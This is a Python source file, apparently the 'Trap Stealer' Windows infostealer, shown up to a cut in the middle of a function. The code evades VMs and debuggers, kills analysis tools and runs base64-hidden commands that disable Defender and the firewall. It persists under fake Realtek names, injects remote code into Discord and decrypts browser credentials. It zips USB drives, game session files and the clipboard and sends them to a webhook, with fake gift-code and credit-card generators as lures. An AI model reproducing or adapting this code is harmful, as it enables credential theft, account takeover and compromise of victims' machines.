import sys, time, random, threading, ctypes, string
import os, re, socket, subprocess
import winreg
from urllib.parse import urlparse
from os.path import isfile, exists
from shutil import copy
import sqlite3
from base64 import b64decode
import winreg
import zipfile
from zipfile import ZipFile
import shutil
import tempfile
from sys import executable, stderr
from ctypes import * 
from json import loads, dumps, load, dump
from pathlib import Path
from locale import windows_locale
from importlib import import_module
import datetime


webhook = '%WEBHOOK%'
logfile = '%Logfile%'
debug = '%Debug%'
FakeWebhook = '%FakeWebhook%'
Fakegen = '%FakeGen%' 
FakeCCgen = '%FakeCCGen%' 
FakeError = '%FakeError%' 
schedule = '%Schedule%'
injection = '%Injection%'
Startup = '%Startup%'
antidebugging = '%No_Debug%'  
DiscordStop = '%Close%' 
OneTimeSteal = '%Onetime%'
melter = '%Melter%'
crasher = '%Crash%'
hidewindow = '%Hide%'
changebio = '%ChangeBio%'
biotext = '%Text%'
Drive = '%Drive%'
close_proc = '%CloseProc%'
ArchiStealer = '%ArchiStealer%'

# WEBSITE UPLOAD 

Gofile = '%GoFileYesOrNo%'
fileio = '%FileIOYesOrNo%'
catbox = '%CatBoxMoeYesOrNo%'

# TRAP EXTENSION

trap_extension = "%TrapExtension%"
Iban_Stealer = "%IbanStealer%"

if Startup == False:
    StartupMessage = 'Adding to startup disabled in the config'
else:
    StartupMessage = 'Error while adding Trap into the startup folder' 
    
requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]

def check_path():

    base_dir = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python'

    python_versions = [f for f in os.listdir(base_dir) if f.startswith('Python')]

    for py_ver in python_versions:
        cryptodome_path = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python\\{py_ver}\\Lib\\site-packages\\Cryptodome'
        crypto_path = f'C:\\Users\\{os.getlogin}\\AppData\\Local\\Programs\\Python\\{py_ver}\\Lib\\site-packages\\Crypto'
        try:
            if os.path.exists(cryptodome_path):
                shutil.copytree(cryptodome_path, crypto_path, dirs_exist_ok=True)  
        except:
            pass


    
for module in requirements:
    try: 
        import_module(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)
try:          
    try:
        from Cryptodome.Cipher import AES
    except:
        try:
            check_path()
            from Cryptodome.Cipher import AES
        except:
            subprocess.Popen(executable + " -m pip install pycryptodome  ", shell=True)
            from Crypto.Cipher import AES
except:
    pass

import requests
        
def error_Handler(err):
    if debug == True:
        def error_Handler(err):
            if isinstance(err, TypeError):
                print("An error occurred: TypeError -", err)
            else:
                print("An error occurred:", err)

        with open('error.txt', 'a')as f:
            f.write(f"{err}\n")
            
def move_file_to_temp_folder(file_path):
    temp_folder = os.path.join(os.environ['TEMP'], 'Logs')
    os.makedirs(temp_folder, exist_ok=True)
    
    try:
        shutil.move(file_path, temp_folder)
    except Exception as e:
        error_Handler(e)
           
def sql_connect(database_path):
    conn = sqlite3.connect(database_path)
    return conn


def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix

if in_virtualenv() == True:
    sys.exit() 

def clear_command_prompt():
    if os.name == 'nt':
        os.system('cls')

def antidebug():
    checks = [check_username,check_windows, check_ip, CheckRegistry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()

def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

def check_username():
    Blacklisted = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR']

    username = os.getenv("COMPUTERNAME")

    if username in Blacklisted[::-1]:
        exit_program('Invalid username')
        
def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit'}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except Exception as e:
                    error_Handler(e)
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)

    
def self_delete():
    try:
        os.remove(__file__)
    except Exception as e:
        error_Handler(e)
def Disa_Def():
    try:
        cmd = b64decode(b'QzpcXFByb2dyYW0gRmlsZXNcXFdpbmRvd3MgRGVmZW5kZXJcXE1wQ21kUnVuLmV4ZSAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbA==').decode()
        subprocess.Popen(cmd, shell= True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        try:
            cmd = b64decode(b'cG93ZXJzaGVsbCAibmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZiIJ').decode() # NEED ADMIN RIGHTS
            subprocess.Popen(cmd, shell= True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except:
            error_Handler(e)
            pass
    except Exception as e:
        error_Handler(e)
        pass
            
def check_ip():
    blacklisted = [
        '822.842.352.43', '311.45.741.48', '64.842.821.32', '441.291.112.29', '432.75.04.291',
        '3.15.932.591', '72.0.501.43', '071.352.58.43', '302.622.231.88', '701.39.291.53',
        '022.47.241.43', '47.011.112.291', '341.19.501.881', '42.18.52.59', '19.451.47.901',
        '151.722.911.212', '142.27.501.43', '902.57.612.39', '061.901.112.29', '761.722.911.212',
        '031.64.38.43', '09.451.47.901', '05.8.931.87', '21.26.741.48', '79.0.112.08',
        '611.19.501.881', '961.371.541.901', '54.411.821.391', '32.69.831.43', '21.74.732.53',
        '142.342.58.43', '95.15.932.591', '05.241.33.312', '001.522.231.88', '83.21.81.401',
        '722.96.922.53', '991.55.112.29', '102.391.522.391', '312.05.661.78', '09.402.52.59',
        '411.641.141.43', '471.98.541.43', '31.6.991.53', '52.542.141.43', '301.82.78.291',
        '222.67.47.591', '86.381.501.43', '17.132.231.88', '07.561.932.871', '85.591.541.43',
        '961.991.351.88', '29.451.47.901', '061.87.451.491', '501.571.181.591', '261.21.421.46',
        '371.19.501.881', '371.061.99.02', '26.25.112.29', '33.902.401.97', '832.722.231.88','371.061.99.02','34.17.55.59'
    ]
    while True:
        try:
            response = requests.get("/moc.swanozama.pikcehc//:sptth"[::-1]) # AmazonCheckIp
            ip_address = response.content.decode()
            if ip_address in blacklisted[::-1]:
                exit_program('Blacklisted IP')
            return
        except Exception as e:
            error_Handler(e)
            pass
        
def CheckRegistry():
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
        )
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
        )
        if reg1 != 1 and reg2 != 1:
            exit_program('VM Detected')

        handle = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
        )
        try:
            reg_val = winreg.QueryValueEx(handle, "0")[0]
            if ("VMware" or "VBOX") in reg_val:
                exit_program('VM')
        finally:
            winreg.CloseKey(handle)


def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('Strange dll detected!')

card_data = {
    'Visa': {
        'iinRanges': ['4'],
        'lengths': [13, 16]
    },
    'Visa Electron': {
        'iinRanges': ['4026', '417500', '4508', '4844', '4913', '4917'],
        'lengths': [16]
    }
}

def generate_credit_card(attempt=1):
    if attempt > 100:
        raise ValueError("Unable to generate a valid Visa card number after 100 attempts.")

    card_info = card_data['Visa']
    iin_range = random.choice(card_info['iinRanges'])
    length = random.choice(card_info['lengths'])
    card_number = iin_range + ''.join(str(random.randint(0, 9)) for _ in range(length - len(iin_range)))

    if luhn_check(card_number):
        expiry_date = generate_expiry_date()
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(3))
        return f"{card_number}|{expiry_date}|{cvv}"
    else:
        return generate_credit_card(attempt + 1)

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits + [sum(divmod(int(d) * 2, 10)) for d in even_digits])
    return checksum % 10 == 0

def generate_expiry_date():
    current_year = datetime.datetime.now().year
    year = current_year + random.randint(1, 5)
    month = str(random.randint(1, 12)).zfill(2)
    return f'{month}/{str(year)[-2:]}'

def webhook_tools():
    try:
        inputmain = input('1 - Spam a Webhook\n2 - Delete Webhook\n')
        if inputmain == '1':
            timetospam = input('Number of messages -> ')
            data = {'message': 'your_message'}
            url = input('Webhook URL -> ')

            for i in range(int(timetospam)):
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                response = requests.post(url, data=data, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent successfully")
                else:
                    print(f"Failed to send message: {response.status_code}")

                time.sleep(0.2)

            print('Ended. Press Any Key to Leave')
        elif inputmain == '2':
            url = input('Webhook URL -> ')
            response = requests.delete(url)
            if response.status_code == 200:
                print('Webhook deleted successfully')
            else:
                print(f"Failed to delete webhook: {response.status_code}")

            print('Press any key to quit')
        else:
            print('Wrong input')
            time.sleep(1)
    except Exception as e:
        error_Handler(e)
        pass

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

file_path = os.path.realpath(__file__)

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', c_ulong),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = create_string_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotected(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

wltZip = []
GamingZip = []
OtherZip = []

def fakegen():
    try:
        time.sleep(1)
        clear_command_prompt()
        print('''
        ███╗   ██╗██╗████████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ██╗
        ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
        ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
        ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
        ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
        ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝''')

        codes_list = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
        count_generator = 0
        valid_url = random.randint(1, 1000)
        valid_test = -1
        print('Scrapping Proxies...')
        print('Founded Proxies starting...')

        def generate_codes(essay):
            nonlocal count_generator, valid_test
            for i in range(essay):
                count_generator += 1
                codes = ''.join(random.choices(codes_list, k=16))
                url = "https://discord.gift/" + codes
                print(f"{count_generator}. {url} - NOT WORKING")
                if valid_test == valid_url:
                    print(f"\nCongratulations! You found a valid code:\n{url}\n")
                    time.sleep(3600)
                valid_test = random.randint(1, 100000)
                time.sleep(0.05)

        while True:
            essay = input("How many codes do you want to generate? (Enter a number): ")
            if not essay.isdigit() or int(essay) < 1:
                print("Invalid input. Please enter a positive integer.")
                continue
            essay = int(essay)

            thread = threading.Thread(target=generate_codes, args=(essay,))
            thread.start()

    except Exception as e:
        print(f"An error occurred: {e}")

def fakeError():
    ctypes.windll.user32.MessageBoxW(None, 'An unexpected error occurred while processing the data. Error code: 0x87D00325', 'Fatal Error', 0)

def fakeccgen():
    try:
        time.sleep(1)
        clear_command_prompt()
        print('''
░█████╗░░█████╗░░██████╗░███████╗███╗░░██╗
██╔══██╗██╔══██╗██╔════╝░██╔════╝████╗░██║
██║░░╚═╝██║░░╚═╝██║░░██╗░█████╗░░██╔██╗██║
██║░░██╗██║░░██╗██║░░╚██╗██╔══╝░░██║╚████║
╚█████╔╝╚█████╔╝╚██████╔╝███████╗██║░╚███║
░╚════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚══╝
        ''')

        while True:
            essay = input("How many credit cards do you want to generate? (Enter a number): ")
            if not essay.isdigit() or int(essay) < 1:
                print("Invalid input. Please enter a positive integer.")
                continue
            essay = int(essay)

            for _ in range(essay):
                visa_card = generate_credit_card()
                print(visa_card)

    except Exception as e:
        print(f"An error occurred: {e}")


def DecryptValue(Buffer, master_key=None):
        starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = Buffer[3:15]
            payload = Buffer[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except Exception as e:
                error_Handler(e)
                pass
            return decrypted_pass

def steal_driver():
    
    drive_detected = False
    while not drive_detected:
        try:
            out = subprocess.check_output('wmic logicaldisk get DriveType, caption', shell=True)
            drives = str(out, 'utf-8').strip().split('\r\r\n')

            for drive in drives:
                if '2' in drive:
                    drive_detected = True
                    drive_letter = drive.split(':')[0]
                    drive_type = drive.split(':')[1].strip()
                    zip_name = f'{drive_letter}_Drive.zip'
                    temp_dir = os.path.join(os.environ['TEMP'], 'DriveCompression')
                    os.makedirs(temp_dir, exist_ok=True)
                    zip_path = os.path.join(temp_dir, zip_name)
                    with ZipFile(zip_path, 'w') as zipf:
                        for foldername, subfolders, filenames in os.walk(f'{drive_letter}:\\'):
                            for filename in filenames:
                                file_path = os.path.join(foldername, filename)
                                zipf.write(file_path, arcname=os.path.relpath(file_path, f'{drive_letter}:\\'))
                    
                    if logfile == True:
                        move_file_to_temp_folder()
                    
                    else:
                        upload = upload_file(zip_path)
                        
                        data = {
                    
                    "username": "Trap Stealer",
                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                    "embeds": [
                        {
                            "title": "🍪 Trap Stealer USB Drivers",
                            "description": f"USB Drivers Files\n{upload}",
                            "color": 0xffb6c1,
                            "thumbnail": {
                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                            },
                            "footer": {
                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                            }
                        }
                    ]
                }
                        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        except Exception as e:
            error_Handler(e)
            pass

def create_zip_file(file_paths, zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'w') as zipf:
        for file_path in file_paths:
            if os.path.exists(file_path):
                zipf.write(file_path, os.path.basename(file_path))
            else:
                pass

def minecraft_sessions():
    try:
        user_home = os.path.expanduser('~')

        minecraft_path = os.path.join(os.environ['APPDATA'], '.minecraft')
        launcher_profiles_path = os.path.join(minecraft_path, 'launcher_profiles.json')

        lunarclient_path = os.path.join(user_home, '.lunarclient')
        lunarclient_accounts_path = os.path.join(lunarclient_path, 'settings', 'game', 'accounts.json')

        files_to_check = [
            launcher_profiles_path,
            lunarclient_accounts_path
        ]

        existing_files = [file_path for file_path in files_to_check if os.path.exists(file_path)]

        zip_file_path = os.path.join(user_home, 'AppData', 'Local', 'Temp', 'existing_files.zip')

        if existing_files:
            create_zip_file(existing_files, zip_file_path)
            if logfile == True:
                move_file_to_temp_folder(zip_file_path)
            else:
                file_url = upload_file(zip_file_path)
                data = {
                        "username": "Trap Stealer",
                        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                        "embeds": [
                            {
                                "title": "Minecraft Session stealer",
                                "description": f"All sessions files found!",
                                "color": 0xffb6c1,
                                "fields": [
                                    {"name": f"Minecraft sessions files", "value": f"[Click here to download]({file_url})"},
                                ],
                                "thumbnail": {
                                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                                },
                                "footer": {
                                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
                                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                                }
                            }
                        ]
                }

                headers = {
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                }

                LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
                        
        else:
            pass
    except Exception as e:
        error_Handler(e)
        
    
def ArchiSteamFarm():
    try:
        def search_for_exe(filename, start_dir):
            found_folders = []
            for root, dirs, files in os.walk(start_dir):
                for file in files:
                    if filename.lower() == file.lower():
                        found_folders.append(root)
                        break  
            return found_folders

            

        def zip_config_folders(folders, base_zip_filename):
            zip_filename = os.path.join(tempfile.gettempdir(), base_zip_filename + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + ".zip")
            with zipfile.ZipFile(zip_filename, 'w') as zipf:
                for folder in folders:
                    config_folder = os.path.join(folder, 'config')
                    if os.path.exists(config_folder):
                        for root, dirs, files in os.walk(config_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                zipf.write(file_path, os.path.join('config', f'{folder}_{file}'))
            return zip_filename
        try:
            found_folders = search_for_exe("archisteamfarm.exe", os.path.join(os.path.expanduser('~'), 'Desktop'))
        except Exception as e:
            error_Handler(e)
            pass
        
        if found_folders:
            try:
                zip_filename = zip_config_folders(found_folders, "ArchiSteamFarmConf")
                if logfile == True:
                    move_file_to_temp_folder(zip_filename)
                else:
                    file_url = upload_file(zip_filename)
                    data = {
                            "username": "Trap Stealer",
                            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                            "embeds": [
                                {
                                    "title": "ArchiSteamFarm Stealer",
                                    "description": f"All config files found!",
                                    "color": 0xffb6c1,
                                    "fields": [
                                        {"name": f"ArchiSteamFarm file", "value": f"[Click here to download]({file_url})"},
                                    ],
                                    "thumbnail": {
                                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                                    },
                                    "footer": {
                                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
                                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                                    }
                                }
                            ]
                    }

                    headers = {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }

                    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
                
            except Exception as e:
                error_Handler(e)
    except Exception as e:
        error_Handler(e)

def check_python_or_convert(file_path):
    _, file_extension = os.path.splitext(file_path)

    if ".py" in file_path:
        return file_path 

    file_path = os.path.splitext(file_path)[0] + ".exe"

    return file_path
def clip():
    try:
        command = 'Get-Clipboard -TextFormatType Text'
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, check=True)
        clipboard_data = result.stdout.strip()
        return clipboard_data
    except subprocess.CalledProcessError as e:
        return 'Error while getting clipboard'

apppp = 'atadppa'
path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"

def get_random_path():
    possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
    chosen_path = random.choice(possible_paths)
    return chosen_path

def generate_random_filename():
    random_chars = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg']
    return random_chars + random.choice(file_extensions)

def create_copy_and_return_new_path():
    current_script_path = sys.argv[0]
    
    new_filename = generate_random_filename()
    new_path = os.path.join(get_random_path(), new_filename)
    
    shutil.copy2(current_script_path, new_path)
    
    return new_path

def DeobfuscateWeb(encrypted_text, key):
    decrypted = [0] * 256
    for i, char in enumerate(key):
        decrypted[char] = i

    decrypted_text = []
    for char in encrypted_text:
        decrypted_char = decrypted[char]
        decrypted_text.append(decrypted_char)
    return bytes(decrypted_text)


def ats(new_path):
    faked = 'SecurityHealthSystray.exe'
    addrs = f"{sys.executable} {new_path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {addrs}")

def hide_console1():
    kernel32 = ctypes.WinDLL("kernel32.dll")
    user32 = ctypes.WinDLL("user32.dll")
    get_console_window = kernel32.GetConsoleWindow
    show_window = user32.ShowWindow
    hwnd = get_console_window()
    show_window(hwnd, 0)

def hide_console2():
    user32 = ctypes.WinDLL("user32.dll")
    get_foreground_window = user32.GetForegroundWindow
    show_window = user32.ShowWindow
    hwnd = get_foreground_window()
    show_window(hwnd, 0)
    

def startup():
    try:
        global StartupMessage
        StartupMessage = 'Sucessfully added to startup'
        try:
    
            new_path = create_copy_and_return_new_path()
            try:
                ats(new_path)
            except Exception as e:
                pass
        except Exception as e:
            error_Handler(e)
    except Exception as e:
        error_Handler(e)
        
    try:
        if getattr(sys, 'frozen', False):
            path = sys.executable
            
        else:
            path = __file__

        startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
        if not isfile(startuppath):
            if ".py" in path:
                copy(path, startuppath)
            elif ".pyw" in path:
                copy(path, startuppath)
            else:
                startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.exe"
                copy(path, startuppath)
    except Exception as e:
        error_Handler(e)
    
def LoadUrlib(hook, data='', files='', headers=''):
    
    hook = DeobfuscateWeb(webhook[0],webhook[1]).decode()
    for i in range(8):
        try:
            if headers != '':
                r = requests.post(hook, data=data, headers=headers)
                return r
            else:
                r = requests.post(hook, data=data)
                return r
        except Exception as e:
            error_Handler(e)

Desc= 'drocsiD'[::-1]
Dscptb= 'BTPdrocsiD'[::-1]
Dsccana = 'yranaCdrocsiD'[::-1]
Dscdev = 'tnempoleveDdrocsiD'[::-1]

from urllib.request import urlopen
def NoDiscord():
    try:
            
        ind = "sj.xedni"
        folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
        for folder_name in folder_list:
            folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
            if os.path.isdir(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                            file_path = os.path.join(root, file)
                            with open(file_path, "w+", encoding="utf-8") as f:
                                f.write('error')

    except Exception as e:
        error_Handler(e)
def idisc():
    try:
        ind = "sj.xedni"
        global webhook

        inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"

        folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
        for folder_name in folder_list:
            folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
            if os.path.isdir(folder_path):
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                            file_path = os.path.join(root, file)
                            hook = DeobfuscateWeb(webhook[0],webhook[1]).decode()
                            inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", hook)
                            with open(file_path, "w", encoding="utf-8") as f:
                                f.write(inj_content)
    except Exception as e:
        error_Handler(e)

pas = 'drowssaP'
def systemInfo():
    try:
        system = os.name
        if system == 'nt':
                
            node_name = os.getenv("COMPUTERNAME")
            release = os.getenv("SystemRoot").split("\\")[-1]
            version = os.getenv("OSVERSION_VERSION")
            machine = os.getenv("PROCESSOR_ARCHITECTURE")
            processor = os.getenv("PROCESSOR_IDENTIFIER")
            home_dir = os.getenv("USERPROFILE")

            sys_info = f"System information:\n"\
                    f"`{system}\n"\
                    f"Node name: {node_name}\n"\
                    f"Release: {release}\n"\
                    f"Version: {version}\n"\
                    f"Machine: {machine}\n"\
                    f"Processor: {processor}\n"\
                    f"Home directory: {home_dir}\n"
            
            sys_info = f"```{sys_info}```"

            return sys_info
    except Exception as e:
        error_Handler(e)
        return 'Error'

def avs():
    try:
        script = b64decode('''
        JGZpbGVQYXRoID0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcQXBwRGF0YVxMb2NhbFxUZW1wXHdpbnZzLnR4dCIKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRmaWxlUGF0aCkpIHsKICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGZpbGVQYXRoIC1JdGVtVHlwZSBGaWxlCiAgICAgICAgfQogICAgICAgIENsZWFyLUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoCiAgICAgICAgUG93ZXJzaGVsbCAtY29tbWFuZCAiR2V0LUNpbUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdC9TZWN1cml0eUNlbnRlcjIgLUNsYXNzTmFtZSBBbnRpdmlydXNQcm9kdWN0IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZGlzcGxheU5hbWUiID4+ICRmaWxlUGF0aA==
        ''').decode()

        subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass', script], check=True)

        username = os.getlogin()

        file_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Temp', 'winvs.txt')

        with open(file_path, 'r', encoding='utf-16') as file:
            content = file.read().strip()

        return content


    except Exception as e:
        error_Handler(e)

    return None



def run_command(command):
    try:
        result = (
            subprocess.check_output(command, shell=True)
            .decode()
            .strip()
        )
        return result
    except Exception as e:
        error_Handler(e)
        return 'N/A'

def get_product_key():
    try:
